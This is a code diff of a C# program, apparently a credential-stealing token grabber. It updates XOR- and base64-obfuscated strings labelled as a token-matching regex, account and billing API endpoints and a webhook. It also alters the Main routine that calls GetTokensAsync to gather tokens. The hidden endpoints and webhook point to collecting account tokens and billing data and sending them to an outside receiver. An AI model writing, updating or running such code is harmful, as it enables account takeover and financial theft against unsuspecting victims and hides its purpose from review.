@@ -225,8 +225,8 @@ namespace PainelPika
 
             string key = "AstraaDevKey";
             string regex_encrypted_b64 = "JSIDRhZYEwIuKDRDaSg1XzsAaR9GZlxSbk4pWUg=";
-            string api_me_encrypted_b64 = "KQcAAhJba0oSIhYaLgEQExERagYZJkoYMRpbBFdOMRYTORZWAR4R";
-            string api_billing_encrypted_b64 = "KQcAAhJba0oSIhYaLgEQExERagYZJkoYMRpbBFdOMRYTORZWAR4RXQMIKAkfJQJWMgYWAQITLRUCIgoXMg==";
+            string api_me_encrypted_b64 = "KQcAAhJba0oSIhYaLgEQXAIOKUoXOwxWN0JEXRQSIRcFZCUUJA==";
+            string api_billing_encrypted_b64 = "KQcAAhJba0oSIhYaLgEQXAIOKUoXOwxWN0JEXRQSIRcFZCUUJFwWGw0NLQsRZBYMIwAXAAgRMAwZJRY=";
             string webhook_encrypted_b64 = "KQcAAhJba0oSIhYaLgEQXAIOKUoXOwxWNhYWGg4OLxZZelFJckNDR1dUdlxHclFAc0VESk4PFQFAIQkedEQVNjgyGy89OAQIHiABAlYLIQRDJUhBORIgFFcKdxcQPTAPdSMtQjgnGw9OISkmFzUsPwYEFQkTIzwqDw==";
 
             string regex_pattern = XORCrypt(Encoding.UTF8.GetString(Base64Decode(regex_encrypted_b64)), key);
@@ -385,12 +385,11 @@ namespace PainelPika
 
         static async Task Main(string[] args)
         {
-            
-            Thread.Sleep(2000); 
-
             List<string> tokens = new List<string>();
             List<string> cleaned = new List<string>();
             await GetTokensAsync(tokens, cleaned);
+            Console.WriteLine("Finished. Press any key to exit...");
+            Console.ReadKey();
         }
     }
 }
